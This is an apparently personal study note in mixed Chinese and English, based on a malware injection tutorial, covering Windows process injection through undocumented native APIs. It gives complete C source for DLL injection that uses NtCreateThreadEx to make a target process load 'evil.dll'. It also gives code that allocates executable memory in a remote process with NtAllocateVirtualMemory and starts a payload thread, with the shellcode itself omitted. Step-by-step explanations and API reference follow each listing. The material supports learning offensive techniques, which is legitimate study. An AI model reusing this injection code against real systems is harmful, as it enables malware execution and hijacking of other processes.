> [!check] P182/932

[toc]


### 0x21 DLL injection - NtCreateThreadEx(undoc)
ref: https://cocomelonc.github.io/tutorial/2021/12/06/malware-injection-9.html

> `CreateRemoteThreadEx` 的Nt版本

```c
   #include <stdio.h>
   #include <stdlib.h>
   #include <string.h>
   #include <windows.h>
   #include <tlhelp32.h>
   #include <vector>
   
   #pragma comment(lib, "advapi32.lib") 
   
   typedef NTSTATUS(NTAPI* pNtCreateThreadEx) (
     OUT PHANDLE hThread,
     IN ACCESS_MASK DesiredAccess,
     IN PVOID ObjectAttributes,
     IN HANDLE ProcessHandle,
     IN PVOID lpStartAddress,
     IN PVOID lpParameter,
     IN ULONG Flags,
     IN SIZE_T StackZeroBits,
     IN SIZE_T SizeOfStackCommit,
     IN SIZE_T SizeOfStackReserve,
     OUT PVOID lpBytesBuffer
   );
   
   // get process PID
   int findMyProc(const char *procname) {
   
     HANDLE hSnapshot;
     PROCESSENTRY32 pe;
     int pid = 0;
     BOOL hResult;
   
     // snapshot of all processes in the system
     hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (INVALID_HANDLE_VALUE == hSnapshot) return 0;
   
     // initializing size: needed for using Process32First
     pe.dwSize = sizeof(PROCESSENTRY32);
   
     // info about first process encountered in a system snapshot
     hResult = Process32First(hSnapshot, &pe);
   
     // retrieve information about the processes
     // and exit if unsuccessful
     while (hResult) {
       // if we find the process: return process ID
       if (strcmp(procname, pe.szExeFile) == 0) {
         pid = pe.th32ProcessID;
         break;
       }
       hResult = Process32Next(hSnapshot, &pe);
     }
   
     // closes an open handle (CreateToolhelp32Snapshot)
     CloseHandle(hSnapshot);
     return pid;
   }
   
   int main(int argc, char* argv[]) {
     DWORD pid = 0; // process ID
     HANDLE ph; // process handle
     HANDLE ht; // thread handle
     LPVOID rb; // remote buffer
     SIZE_T rl; // return length
   
     char evilDll[] = "evil.dll";
     int evilLen = sizeof(evilDll) + 1;
     
     HMODULE hKernel32 = GetModuleHandle("Kernel32");
     LPTHREAD_START_ROUTINE lb = (LPTHREAD_START_ROUTINE) GetProcAddress(hKernel32, "LoadLibraryA");
     pNtCreateThreadEx ntCTEx = (pNtCreateThreadEx)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");
     
     if (ntCTEx == NULL) {
       CloseHandle(ph);
       printf("NtCreateThreadEx failed :( exiting...\n");
       return -2;
     }
   
     pid = findMyProc(argv[1]);
     if (pid == 0) {
       printf("PID not found :( exiting...\n");
       return -1;
     } else {
       printf("PID = %d\n", pid);
   
       ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);
   
       if (ph == NULL) {
         printf("OpenProcess failed :( exiting...\n");
         return -2;
       }
   
       // allocate memory buffer for remote process
       rb = VirtualAllocEx(ph, NULL, evilLen, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
   
       // write payload to memory buffer
       WriteProcessMemory(ph, rb, evilDll, evilLen, rl); // NULL);
   
       ntCTEx(&ht, 0x1FFFFF, NULL, ph, (LPTHREAD_START_ROUTINE) lb, rb, FALSE, NULL, NULL, NULL, NULL);
   
       if (ht == NULL) {
         CloseHandle(ph);
         printf("ThreadHandle failed :( exiting...\n");
         return -2;
       } else {
         printf("successfully inject via NtCreateThreadEx :)\n");
       }
       
       WaitForSingleObject(ht, INFINITE);
   
       CloseHandle(ht);
       CloseHandle(ph);
     }
     return 0;
   }
```

Simillear as [0x06 DLL hijacking](#0x06%20DLL%20hijacking) but with native api
1. get `LoadLibraryA` addr from kernel32 (`GetModuleHandle(kernel32)`, `GetProcAddress`)
	1. 用call by handle
2. get `NtCreateThreadEx` addr from ntdll (`GetProcAddr`, `GetModuleHandle`)
	1. 直接inline call (兩種意思差不多)
3. get target process PID (`findMyProc`)
	1. 這邊讀args找的target name
4. open a process and alloc a dll's size of buffer inside (`OpenProcess(ALL)`, `VirtualAllocEx`)
5. write payload (`WriteProcMemory`)
6. 在process裡面開thread (`NtCreateThreadEx`)
	1. running `LoadLibraryA("evil.dll")`
	2. 結論是evil.dll 被載入目標 process

*Alternative*
use `LdrLoadDll` instead of `LoadLibraryA`
```
main()
 ├─ EnableDebugPrivilege()
 ├─ InjectDll()
 │   ├─ OpenProcess()
 │   ├─ 寫入 THREAD_DATA
 │   ├─ 寫入 ThreadProc shellcode
 │   └─ NtCreateThreadEx → 執行 LdrLoadDll
 │
 └─ FreeDll()
     └─ NtCreateThreadEx → 執行 FreeLibrary
```

> [!example] NtCreateThread & NtCreateThread & NtClose
>> 🧩NtCreateThreadEx
> ```c
> NtCreateThreadEx(
>     _Out_ PHANDLE ThreadHandle,
>     _In_ ACCESS_MASK DesiredAccess,
>     _In_opt_ PCOBJECT_ATTRIBUTES ObjectAttributes,
>     _In_ HANDLE ProcessHandle,
>     _In_ PUSER_THREAD_START_ROUTINE StartRoutine,
>     _In_opt_ PVOID Argument,
>     _In_ ULONG CreateFlags, // THREAD_CREATE_FLAGS_*
>     _In_ SIZE_T ZeroBits,
>     _In_ SIZE_T StackSize,
>     _In_ SIZE_T MaximumStackSize,
>     _In_opt_ PPS_ATTRIBUTE_LIST AttributeList
>     );
> ```
> - 用途: Create remote Thread 
> 
> > 🧩NtCreateThread
> - 區別: legend ver. / 不能跨 session injection / 沒有thread flag支援
> 
> > 🧩NtClose
> - 用途: return handle
> - 時機: 用完之後釋放資源

### 0x22 Code injection - NtAllocateVirtualMemory(undoc)

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#pragma comment(lib, "ntdll")

typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
  HANDLE             ProcessHandle,
  PVOID              *BaseAddress,
  ULONG              ZeroBits,
  PULONG             RegionSize,
  ULONG              AllocationType,
  ULONG              Protect
);
//----- SNIP SOME PAYLOAD

// -------------------
unsigned int my_payload_len = sizeof(my_payload);

int main(int argc, char* argv[]) {
  HANDLE ph; // process handle
  HANDLE rt; // remote thread
  PVOID rb; // remote buffer

  HMODULE ntdll = GetModuleHandleA("ntdll");

  // parse process ID
  printf("PID: %i", atoi(argv[1]));
  // asign target addr
  ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
  // get addr from handle
  pNtAllocateVirtualMemory myNtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(ntdll, "NtAllocateVirtualMemory");  
  
  // allocate memory buffer for remote process
  // kernel memory reservation + commit
  myNtAllocateVirtualMemory(ph, &rb, 0, (PULONG)&my_payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  
  // "copy" data between processes
  WriteProcessMemory(ph, rb, my_payload, my_payload_len, NULL);

  // our process start new thread
  rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)rb, NULL, 0, NULL);
  CloseHandle(ph);
  return 0;
}
```

1. (prepare) typedef func signature
2. Open a process in the target pid (`OpenProcess`)
3. 從ntdll撈 ntapi's addr (`GetProcessAddress`, `GetModuleHandleA`)
4. call the ntapi to alloc mem on remote proc
	1. kernel memory reservation + commit
	2. alloc payload 長度
5. copy data to target proc (`WriteProcesMemory)
6. start a new thread to run payload (`CreateRemoteThread`)
	1. thread → CPU RIP = rb → execute instructions
7. close handle

> [!example]+ NtAllocateVirtualMemory
> >🧩NtAllocateVirtualMemory
> ```cpp
> __kernel_entry NTSYSCALLAPI NTSTATUS NtAllocateVirtualMemory(
>   [in]      HANDLE    ProcessHandle,
>   [in, out] PVOID     *BaseAddress,
>   [in]      ULONG_PTR ZeroBits,
>   [in, out] PSIZE_T   RegionSize,
>   [in]      ULONG     AllocationType,
>   [in]      ULONG     Protect
> );
> ```
> 用途: 替代VirtualAlloc，在指定process的user mode虛擬位址空間中保留和提交memory pages
>
